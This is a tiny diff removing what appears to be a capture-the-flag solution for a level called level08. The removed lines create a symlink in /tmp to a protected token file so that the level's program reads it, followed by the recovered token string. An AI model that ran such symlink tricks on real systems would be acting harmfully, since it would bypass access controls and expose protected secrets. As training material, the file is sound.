@@ -1,6 +1,0 @@
-mkdir -p /tmp/level08
-cd /tmp/level08
-ln -s /home/user/level08/token symlink_token
-/home/user/level08/level08 ./symlink_token
-
-quif5eloekouj29ke0vouxean
